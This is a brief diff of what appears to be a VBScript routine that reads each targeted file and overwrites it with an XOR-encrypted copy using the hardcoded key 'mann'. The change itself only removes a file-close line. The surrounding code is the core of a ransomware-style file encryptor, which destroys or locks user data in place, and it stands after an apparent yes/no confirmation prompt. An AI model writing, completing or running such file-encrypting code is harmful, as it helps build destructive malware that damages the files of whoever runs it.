@@ -28,7 +28,6 @@ if warning1 = vbYes then
           end if
           set oldfile = fso.opentextfile(item, 1)
           oldfilecontent = oldfile.readall
-          oldfile.close
           keytoencrypt = "mann"
           set newfile = fso.opentextfile(item, 2)
           newfile.write(xorencrypt(oldfilecontent, keytoencrypt))
